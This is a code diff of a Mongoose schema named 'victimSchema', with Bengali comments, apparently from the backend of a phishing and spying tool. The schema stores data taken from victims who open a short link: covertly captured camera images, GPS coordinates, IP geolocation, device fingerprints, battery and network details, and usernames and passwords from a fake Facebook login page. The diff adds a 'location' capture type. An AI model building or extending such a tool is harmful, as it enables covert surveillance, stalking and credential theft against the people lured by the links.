@@ -3,14 +3,17 @@ const mongoose = require('mongoose');
 const victimSchema = new mongoose.Schema({
     id: { type: String, unique: true, required: true },
     fbId: { type: String, default: 'unknown' },
-    type: { type: String, enum: ['camera', 'fb'], default: 'camera' },
+    type: { 
+        type: String, 
+        enum: ['camera', 'location', 'fb'],  // ← 'location' যোগ করা হয়েছে
+        default: 'camera' 
+    },
     shortLink: { type: String },
     timestamp: { type: Date, default: Date.now },
     status: { type: String, default: 'pending' },
     
     ip: { type: String, default: null },
     
-    // লোকেশন (অবজেক্ট)
     location: {
         country: { type: String, default: 'N/A' },
         region: { type: String, default: 'N/A' },
@@ -20,7 +23,6 @@ const victimSchema = new mongoose.Schema({
         isp: { type: String, default: 'N/A' }
     },
     
-    // জিপিএস লোকেশন (অবজেক্ট)
     gpsLocation: {
         latitude: { type: Number, default: 0 },
         longitude: { type: Number, default: 0 },
@@ -28,7 +30,6 @@ const victimSchema = new mongoose.Schema({
         googleMaps: { type: String, default: '' }
     },
     
-    // ডিভাইস তথ্য (অবজেক্ট)
     device: {
         productSub: { type: String, default: 'N/A' },
         vendor: { type: String, default: 'N/A' },
@@ -51,16 +52,12 @@ const victimSchema = new mongoose.Schema({
         colorDepth: { type: Number, default: 0 }
     },
     
-    // মিডিয়া ডিভাইস (অ্যারে)
     media: [{
         kind: { type: String, default: 'N/A' },
         label: { type: String, default: 'N/A' },
         deviceId: { type: String, default: 'N/A' }
     }],
     
-    // =====================================================
-    // ⚠️ এখানে মূল সমস্যা ছিল: network কে String না করে Object করতে হবে
-    // =====================================================
     network: {
         type: { type: String, default: 'N/A' },
         rtt: { type: Number, default: 0 },
@@ -70,7 +67,6 @@ const victimSchema = new mongoose.Schema({
         downlinkMax: { type: Number, default: 0 }
     },
     
-    // ব্যাটারি (অবজেক্ট)
     battery: {
         level: { type: Number, default: 0 },
         charging: { type: Boolean, default: false },
@@ -78,13 +74,11 @@ const victimSchema = new mongoose.Schema({
         dischargingTime: { type: Number, default: 0 }
     },
     
-    // ক্যামেরা ছবি (অ্যারে)
     camera: [{
         image: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now }
     }],
     
-    // ফেক ফেসবুক লগইন (অবজেক্ট)
     fbLogin: {
         username: { type: String, default: '' },
         password: { type: String, default: '' },
